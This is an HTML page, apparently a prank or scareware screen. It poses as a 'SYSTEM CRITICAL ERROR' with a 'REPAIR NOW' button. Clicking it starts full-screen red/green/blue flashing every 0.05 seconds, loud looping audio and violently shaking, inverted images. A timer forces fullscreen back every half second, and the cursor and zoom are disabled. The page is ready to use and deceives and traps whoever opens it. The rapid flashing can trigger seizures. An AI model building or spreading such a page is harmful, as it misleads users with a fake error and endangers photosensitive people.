<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM CRITICAL ERROR</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
        #welcome { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; display: flex; justify-content: center; align-items: center; }
        .fix-btn { background: #f00; color: #fff; border: 8px solid #000; padding: 30px 60px; font-size: 30px; border-radius: 50px; cursor: pointer; }
        @keyframes flash { 0% { background: #f00; } 50% { background: #0f0; } 100% { background: #00f; } }
        .active-chaos { animation: flash 0.05s infinite; }
        #stage { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
        .h-img { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0; transition: opacity 0.5s; }
        @keyframes shake { 0% { transform: translate(0,0) scale(1.1); } 50% { transform: translate(-20px, 20px) rotate(3deg) scale(1.3); filter: invert(1); } 100% { transform: translate(20px, -20px) rotate(-3deg) scale(1.1); } }
        .vibrate { opacity: 1 !important; animation: shake 0.1s infinite linear; }
    </style>
</head>
<body id="b">
    <div id="welcome"><button class="fix-btn" onclick="start()">REPAIR NOW</button></div>
    <div id="stage">
        <img class="h-img" id="i1" src="https://i.ibb.co/RTTgVkyw/image.jpg">
        <img class="h-img" id="i2" src="https://i.ibb.co/VYQnMt9R/image.jpg">
        <img class="h-img" id="i3" src="https://i.ibb.co/ym4GK9sk/image.jpg">
        <img class="h-img" id="i4" src="https://i.ibb.co/4H7RV4m/image.jpg">
    </div>
    <script>
        const imgs = ['i1', 'i2', 'i3', 'i4'];
        const audioUrl = "https://www.myinstants.com/media/sounds/nykwny.mp3";
        function start() {
            document.getElementById('welcome').style.display = 'none';
            document.getElementById('b').classList.add('active-chaos');
            document.getElementById('stage').style.display = 'block';
            let audio = new Audio(audioUrl); audio.loop = true; audio.play();
            let current = 0;
            document.getElementById(imgs[current]).classList.add('vibrate');
            setInterval(() => {
                document.getElementById(imgs[current]).classList.remove('vibrate');
                current = (current + 1) % imgs.length;
                document.getElementById(imgs[current]).classList.add('vibrate');
            }, 10000); // تتبدل كل 10 ثوانٍ سواسوة
            setInterval(() => { if (!document.fullscreenElement) document.documentElement.requestFullscreen(); }, 500);
        }
    </script>
</body>
</html>
